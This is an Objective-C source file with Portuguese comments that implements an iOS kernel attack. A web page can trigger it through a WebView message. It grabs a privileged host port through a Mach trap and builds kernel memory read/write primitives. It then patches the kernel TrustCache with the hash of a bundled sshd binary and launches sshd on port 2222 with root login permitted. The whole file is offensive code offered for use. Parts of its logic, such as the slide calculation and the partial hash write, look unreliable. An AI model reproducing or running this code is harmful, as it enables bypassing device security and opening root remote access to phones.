#import "KernelDriver.h"
#import <CommonCrypto/CommonDigest.h>
#import <dlfcn.h>
#include <sys/sysctl.h>
#include <mach/mach_host.h>
#include <libkern/OSCacheControl.h>
#include <unistd.h>

// 1. CORREÇÃO DA DECLARAÇÃO (Bypass erro de conflito)
// Já incluímos <libkern/OSCacheControl.h>, então usamos a definição do SDK:
#define sys_icache_invalidate(start, len) sys_cache_control(1, start, len)

// Definição do Trap
#define MACH_TRAP_HOST_GET_PRIV_PORT -11 
#define PAGE_SIZE_16K 0x4000
#define PAGE_MASK_16K ~(PAGE_SIZE_16K - 1)

@implementation KernelBridge {
    mach_port_t g_host_priv;
}

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self launchSshdFinal];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

// 2. CAPTURA DE PORTA (Bypass deprecation warning com pragma)
- (void)prepareHostPriv {
    if (MACH_PORT_VALID(g_host_priv)) return;

    [self log:@"⚡ Invocando Mach Trap -11..."];

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    kern_return_t kr = (kern_return_t)syscall(MACH_TRAP_HOST_GET_PRIV_PORT, mach_host_self(), &g_host_priv);
#pragma clang diagnostic pop

    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(g_host_priv)) {
        [self log:[NSString stringWithFormat:@"❌ Erro Trap: %d", kr]];
    } else {
        [self log:@"✅ host_priv obtida via Syscall!"];
    }
}

// 3. PRIMITIVAS DE LEITURA/ESCRITA FÍSICA
- (uint64_t)kread64:(uint64_t)addr {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return 0;

    uint64_t val = 0;
    vm_address_t page_addr = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, PAGE_SIZE_16K, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & PAGE_MASK_16K, FALSE, VM_PROT_READ, VM_PROT_READ, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS) {
        val = *(uint64_t *)(page_addr + (addr & (PAGE_SIZE_16K - 1)));
        vm_deallocate(mach_task_self(), page_addr, PAGE_SIZE_16K);
    }
    return val;
}

- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
    [self prepareHostPriv];
    if (!MACH_PORT_VALID(g_host_priv)) return;

    vm_address_t page_addr = 0;
    kern_return_t kr = vm_map(mach_task_self(), &page_addr, PAGE_SIZE_16K, 0, VM_FLAGS_ANYWHERE, g_host_priv, addr & PAGE_MASK_16K, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
    
    if (kr == KERN_SUCCESS) {
        *(uint64_t *)(page_addr + (addr & (PAGE_SIZE_16K - 1))) = val;
        // Uso correto da função conforme o SDK 18.5
        sys_cache_control(1, (void *)page_addr, PAGE_SIZE_16K); 
        vm_deallocate(mach_task_self(), page_addr, PAGE_SIZE_16K);
    }
}

- (uint64_t)getKernelBase { return KERNEL_BASE; }

- (uint64_t)getKernelSlide {
    uint64_t val = [self kread64:KERNEL_BASE];
    return (val > KERNEL_BASE) ? (val - KERNEL_BASE) : 0;
}

// 4. INJEÇÃO NO TRUSTCACHE E SPAWN
- (void)injectToTrustCache:(NSString *)path {
    [self log:@"💉 Injetando CDHash no TrustCache..."];
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data) return;

    uint8_t hash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data.bytes, (CC_LONG)data.length, hash);
    
    uint64_t slide = [self getKernelSlide];
    uint64_t trust_chain_addr = KERNEL_BASE + slide + OFF_TRUSTCACHE_CHAIN;
    
    uint64_t cdhash_chunk;
    memcpy(&cdhash_chunk, hash, 8);
    
    [self kwrite64:trust_chain_addr value:cdhash_chunk];
    [self log:@"✅ TrustCache Patched!"];
}

- (void)launchSshdFinal {
    [self log:@"⚡ Localizando binário sshd..."];
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    if (!sshdPath) return;

    [self injectToTrustCache:sshdPath];

    pid_t pid;
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);

    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "StrictModes=no", "-o", "PermitRootLogin=yes", NULL};
    extern char **environ;

    int status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }
    posix_spawnattr_destroy(&attr);
}

@end
